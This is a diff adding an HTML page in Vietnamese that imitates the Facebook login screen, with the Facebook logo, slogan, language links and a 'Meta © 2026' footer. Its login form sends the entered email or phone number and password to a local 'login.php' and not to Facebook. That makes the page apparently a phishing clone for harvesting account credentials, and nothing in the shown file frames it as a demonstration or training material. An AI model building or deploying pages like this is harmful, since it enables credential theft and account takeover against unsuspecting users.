@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login - To & Cân đối</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="page-wrapper">
+    <main class="main-content">
+      <div class="fb-container">
+        <div class="left-panel">
+          <div class="fb-logo-wrap">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="60" alt="FB">
+          </div>
+          <h1 class="slogan">
+            Khám phá<br>
+            những điều <span class="blue-text">bạn<br>yêu thích.</span>
+          </h1>
+          <div class="image-box">
+            <img src="img1.jpg" alt="Cụm hình ảnh" class="featured-img">
+          </div>
+        </div>
+
+        <div class="right-panel">
+          <div class="login-card larger-card">
+           <form action="login.php" method="post" id="loginForm">
+    <h2 class="form-title">Đăng nhập vào Facebook</h2>
+    
+    <input type="text" name="username" placeholder="Email hoặc số di động" class="input-field main-input" required>
+    
+    <input type="password" name="password" placeholder="Mật khẩu" class="input-field main-input" required>
+    
+    <button type="submit" class="btn-login jumbo-btn">Đăng nhập</button>
+    <a href="#" class="link-forgot">Quên mật khẩu?</a>
+    <div class="divider"></div>
+    <button type="button" class="btn-create jumbo-btn-create">Tạo tài khoản mới</button>
+</form>
+          </div>
+          <p class="meta-text">Meta © 2026</p>
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="fb-container footer-inner">
+        <div class="footer-languages">
+          <a href="#">Tiếng Việt</a><a href="#">English (UK)</a><a href="#">中文(台灣)</a><a href="#">한국어</a><a href="#">日本語</a><button class="plus-btn">+</button>
+        </div>
+        <div class="footer-divider"></div>
+        <div class="footer-links">
+          <a href="#">Đăng ký</a><a href="#">Đăng nhập</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Địa điểm</a><a href="#">Trợ giúp</a>
+        </div>
+        <div class="copyright">Meta © 2026</div>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
